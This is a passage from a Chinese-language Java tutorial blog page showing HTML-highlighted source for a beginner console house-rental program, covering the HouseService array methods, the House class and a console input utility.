class="keyword">private</span> House[] houses ;</span><br><span class="line">    <span class="comment">/**记录当前有多少个房屋信息 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> houseNums = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> idCouter = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HouseService</span><span class="params">(<span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">        <span class="comment">//当创建HouseService对象，指定数组大小</span></span><br><span class="line">        houses = <span class="keyword">new</span> House[size];</span><br><span class="line">        <span class="comment">//为了配合测试列表信息，老韩这里初始化一个House对象</span></span><br><span class="line">        houses[<span class="number">0</span>] = <span class="keyword">new</span> House(<span class="number">1</span>,<span class="string">&quot;jack&quot;</span>,<span class="string">&quot;112&quot;</span>, <span class="string">&quot;海淀区&quot;</span>, <span class="number">2000</span>, <span class="string">&quot;未出租&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//findById方法，返回House对象或者null</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> House <span class="title">findById</span><span class="params">(<span class="keyword">int</span> findid)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; houseNums; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(findid == houses[i].getId())&#123;</span><br><span class="line">                <span class="keyword">return</span> houses[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**add方法，添加新对象，返回boolean*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(House newHouse)</span></span>&#123;</span><br><span class="line">        <span class="comment">//判断是否还可以继续添加（我们暂时不考虑数组扩容的问题）</span></span><br><span class="line">        <span class="keyword">if</span>(houseNums == houses.length)&#123;</span><br><span class="line">            <span class="comment">//不能再添加了</span></span><br><span class="line">            System.out.println(<span class="string">&quot;数组已满，不能再添加了。。。&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//把newHouse对象加入到，新增加了一个房屋</span></span><br><span class="line">        houses[houseNums++] = newHouse;</span><br><span class="line">        <span class="comment">//houseNum++;</span></span><br><span class="line">        <span class="comment">/*我们需要设置id自增长的机制，然后更新newHouse的id*/</span></span><br><span class="line">        <span class="comment">//idCounter++;</span></span><br><span class="line">        newHouse.setId(++idCouter);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**del方法,删除一个房屋信息*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">del</span><span class="params">(<span class="keyword">int</span> delId)</span></span>&#123;</span><br><span class="line">        <span class="comment">//应当先找到删除的房屋信息对应的下标</span></span><br><span class="line">        <span class="comment">//一定要搞清楚，数组下标和房屋编号不是一回事</span></span><br><span class="line">        <span class="keyword">int</span> index = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; houseNums; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(delId == houses[i].getId())&#123;</span><br><span class="line">                <span class="comment">//要删除的房屋对应的(id),是在数组下标为i的元素</span></span><br><span class="line">                index = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">//说明delId在数组中不存在</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果找到</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = index; i &lt; houseNums -<span class="number">1</span>; i++) &#123;</span><br><span class="line">            houses[i] = houses[i+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        houses[--houseNums] = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">/*把最后的一个房屋信息置空</span></span><br><span class="line"><span class="comment">        houses[houseNums-1] = null;</span></span><br><span class="line"><span class="comment">        houseNums--;*/</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**list方法，返回houses*/</span></span><br><span class="line">    <span class="keyword">public</span> House[] list() &#123;</span><br><span class="line">        <span class="keyword">return</span> houses;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="House类">House类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.houserent.domain;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description（描述）:房屋属性，编号  房主  电话  地址  月租  状态(未出租/已出租)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@DATe</span>&amp;TIME（创建时间）: 2022/3/9 - 22:05</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Project</span>_name（项目名）: opp2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span>_name（包名）: com.thestar0.houserent.domain</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>（作者）: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>（版本）: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">House</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * House的对象表示一个房屋信息</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 编号  房主  电话  地址  月租  状态(未出租/已出租)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id ;</span><br><span class="line">    <span class="keyword">private</span> String name ;</span><br><span class="line">    <span class="keyword">private</span>  String phone;</span><br><span class="line">    <span class="keyword">private</span>  String address;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> rent ;</span><br><span class="line">    <span class="keyword">private</span> String state;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">House</span><span class="params">(<span class="keyword">int</span> id, String name, String phone, String address, <span class="keyword">int</span> rent, String state)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.phone = phone;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">        <span class="keyword">this</span>.rent = rent;</span><br><span class="line">        <span class="keyword">this</span>.state = state;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPhone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPhone</span><span class="params">(String phone)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAddress</span><span class="params">(String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getRent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRent</span><span class="params">(<span class="keyword">int</span> rent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.rent = rent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> state;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setState</span><span class="params">(String state)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.state = state;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**为了方便的输出对象信息，我们实现toString</span></span><br><span class="line"><span class="comment">    编号  房主  电话  地址  月租  状态(未出租/已出租)*/</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id +</span><br><span class="line">                <span class="string">&quot;\t\t&quot;</span> + name +</span><br><span class="line">                <span class="string">&quot;\t&quot;</span> + phone +</span><br><span class="line">                <span class="string">&quot;\t\t&quot;</span> + address +</span><br><span class="line">                <span class="string">&quot;\t&quot;</span> + rent +</span><br><span class="line">                <span class="string">&quot;\t&quot;</span> + state ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="utils工具类">utils工具类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.houserent.utils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">工具类的作用:</span></span><br><span class="line"><span class="comment">处理各种情况的用户输入，并且能够按照程序员的需求，得到用户的控制台输入。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Utility</span> </span>&#123;</span><br><span class="line"><span class="comment">//静态属性。。。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 功能：读取键盘输入的一个菜单选项，值：1——5的范围</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 1——5</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span> <span class="title">readMenuSelection</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">            String str = readKeyBoard(<span class="number">1</span>, <span class="keyword">false</span>);<span class="comment">//包含一个字符的字符串</span></span><br><span class="line">            c = str.charAt(<span class="number">0</span>);<span class="comment">//将字符串转换成字符char类型</span></span><br><span class="line">            <span class="keyword">if</span> (c != <span class="string">&#x27;1&#x27;</span> &amp;&amp; c != <span class="string">&#x27;2&#x27;</span> &amp;&amp; </span><br><span class="line">                c != <span class="string">&#x27;3&#x27;</span> &amp;&amp; c != <span class="string">&#x27;4&#x27;</span> &amp;&amp; c != <span class="string">&#x27;5&#x27;</span>) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;选择错误，请重新输入：&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 功能：读取键盘输入的一个字符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 一个字符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span> <span class="title">readChar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String str = readKeyBoard(<span class="number">1</span>, <span class="keyword">false</span>);<span class="comment">//就是一个字符</span></span><br><span class="line">        <span class="keyword">return</span> str.charAt(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 功能：读取键盘输入的一个字符，如果直接按回车，则返回指定的默认值；否则返回输入的那个字符</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> defaultValue 指定的默认值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 默认值或输入的字符</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span> <span class="title">readChar</span><span class="params">(<span class="keyword">char</span> defaultValue)</span> </span>&#123;</span><br><span class="line">        String str = readKeyBoard(<span class="number">1</span>, <span class="keyword">true</span>);<span class="comment">//要么是空字符串，要么是一个字符</span></span><br><span class="line">        <span class="keyword">return</span> (str.length() == <span class="number">0</span>) ? defaultValue : str.charAt(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 功能：读取键盘输入的整型，长度小于2位</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 整数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">readInt</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">            String str = readKeyBoard(<span class="number">10</span>, <span class="keyword">false</span>);<span class="comment">//一个整数，长度&lt;=10位</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                n = Integer.parseInt(str);<span class="comment">//将字符串转换成整数</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;数字输入错误，请重新输入：&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 功能：读取键盘输入的 整数或默认值，如果直接回车，则返回默认值，否则返回输入的整数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> defaultValue 指定的默认值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 整数或默认值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">readInt</span><span class="params">(<span class="keyword">int</span> defaultValue)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">            String str = readKeyBoard(<span class="number">10</span>, <span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (str.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> defaultValue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//异常处理...</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                n = Integer.parseInt(str);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;数字输入错误，请重新输入：&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 功能：读取键盘输入的指定长度的字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> limit 限制的长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 指定长度的字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readString</span><span class="params">(<span class="keyword">int</span> limit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> readKeyBoard(limit, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 功能：读取键盘输入的指定长度的字符串或默认值，如果直接回车，返回默认值，否则返回字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> limit 限制的长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> defaultValue 指定的默认值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 指定长度的字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readString</span><span class="params">(<span class="keyword">int</span> limit, String defaultValue)</span> </span>&#123;</span><br><span class="line">        String str = readKeyBoard(limit, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">return</span> str.equals(<span class="string">&quot;&quot;</span>)? defaultValue : str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 功能：读取键盘输入的确认选项，Y或N</span></span><br><span class="line"><span class="comment"> * 将小的功能，封装到一个方法中.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Y或N</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span> <span class="title">readConfirmSelection</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你的选择(Y/N): 请小心选择&quot;</span>);</span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">for</span> (; ; ) &#123;<span class="comment">//无限循环</span></span><br><span class="line">        <span class="comment">//在这里，将接受到字符，转成了大写字母</span></span><br><span class="line">        <span class="comment">//y =&gt; Y n=&gt;N</span></span><br><span class="line">            String str = readKeyBoard(<span class="number">1</span>, <span class="keyword">false</span>).toUpperCase();</span><br><span class="line">            c = str.charAt(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;Y&#x27;</span> || c == <span class="string">&#x27;N&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;选择错误，请重新输入：&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 功能： 读取一个字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> limit 读取的长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> blankReturn 如果为true ,表示 可以读空字符串。 </span></span><br><span class="line"><span class="comment">     *   如果为false表示 不能读空字符串。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment"> *如果输入为空，或者输入大于limit的长度，就会提示重新输入。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">readKeyBoard</span><span class="params">(<span class="keyword">int</span> limit, <span class="keyword">boolean</span> blankReturn)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line"><span class="comment">//定义了字符串</span></span><br><span class="line">String line = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//scanner.hasNextLine() 判断有没有下一行</span></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNextLine()) &#123;</span><br><span class="line">            line = scanner.nextLine();<span class="comment">//读取这一行</span></span><br><span class="line">           </span><br><span class="line"><span class="comment">//如果line.length=0, 即用户没有输入任何内容，直接回车</span></span><br><span class="line"><span class="keyword">if</span> (line.length() == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (blankReturn) &#123;</span><br><span class="line">                    <span class="keyword">return</span> line;<span class="comment">//如果blankReturn=true,可以返回空串</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">continue</span>; <span class="comment">//如果blankReturn=false,不接受空串，必须输入内容</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果用户输入的内容大于了 limit，就提示重写输入  </span></span><br><span class="line"><span class="comment">//如果用户如的内容 &gt;0 &lt;= limit ,我就接受</span></span><br><span class="line">            <span class="keyword">if</span> (line.length() &lt; <span class="number">1</span> || line.length() &gt; limit) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;输入长度（不能大于&quot;</span> + limit + <span class="string">&quot;）错误，请重新输入：&quot;</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> line;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="测试类（main）">测试类（main）</h3><figure class="highlight java"><table><tr><td 